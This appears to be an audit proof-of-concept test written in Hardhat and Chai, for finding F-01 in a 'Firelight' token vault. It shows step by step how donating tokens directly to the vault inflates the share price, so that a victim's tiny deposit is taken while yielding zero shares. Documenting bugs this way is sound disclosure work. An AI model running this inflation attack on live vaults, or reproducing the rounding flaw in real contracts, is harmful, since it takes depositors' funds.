const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers')
const { deployVault } = require('./setup/fixtures.js')
const { expect } = require('chai')

describe('POC F-01: deposit() mints zero shares but transfers assets', function() {
  
  it('user loses assets by receiving 0 shares', async () => {
    
    const { firelight_vault, token_contract, users, utils, deployer, limit_updater } = await loadFixture(deployVault)
    const [victim, bigDepositor] = users

    // Step 1: Raise deposit limit to allow big donation
    await firelight_vault.connect(limit_updater).updateDepositLimit('999999999999999')
    console.log('Deposit limit raised')

    // Step 2: BigDepositor deposits normally to create shares
    const bigAmount = '1000000' // 1 FXRP
    await utils.mintAndApprove(bigAmount, bigDepositor)
    await firelight_vault.connect(bigDepositor).deposit(bigAmount, bigDepositor.address)

    const totalSupply = await firelight_vault.totalSupply()
    console.log('Total supply:', totalSupply.toString())
    console.log('Total assets:', (await firelight_vault.totalAssets()).toString())

    // Step 3: Donate directly to vault to inflate share price
    // totalAssets grows but totalSupply stays same
    // 1 share now worth 100,001 assets
    const donationAmount = '100000000000'
    await token_contract.mintTo(deployer.address, donationAmount)
    await token_contract.connect(deployer).transfer(
      await firelight_vault.getAddress(),
      donationAmount
    )

    const totalAssets = await firelight_vault.totalAssets()
    console.log('Total assets after donation:', totalAssets.toString())
    console.log('Share price:', (totalAssets / totalSupply).toString(), 'assets per share')

    // Step 4: Victim deposits 1 wei
    // share math: 1 * (1000000 + 1) / (100001000000 + 1) = 0 (rounds down)
    const tinyAmount = 1n
    await token_contract.mintTo(victim.address, tinyAmount)
    await token_contract.connect(victim).approve(
      await firelight_vault.getAddress(),
      tinyAmount
    )

    const tokenBefore = await token_contract.balanceOf(victim.address)
    console.log('\nVictim tokens before:', tokenBefore.toString())
    console.log('Victim shares before:', (await firelight_vault.balanceOf(victim.address)).toString())

    // Step 5: This should succeed but give 0 shares
    await firelight_vault.connect(victim).deposit(tinyAmount, victim.address)

    const tokenAfter = await token_contract.balanceOf(victim.address)
    const sharesAfter = await firelight_vault.balanceOf(victim.address)
    console.log('Victim tokens after:', tokenAfter.toString())
    console.log('Victim shares after:', sharesAfter.toString())
    console.log('\nTokens lost:', (tokenBefore - tokenAfter).toString())
    console.log('Shares gained:', sharesAfter.toString())

    // PROOF: assets taken, 0 shares given
    expect(sharesAfter).to.equal(0n, 'Got 0 shares')
    expect(tokenAfter).to.equal(0n, 'Lost tokens')

  })
})
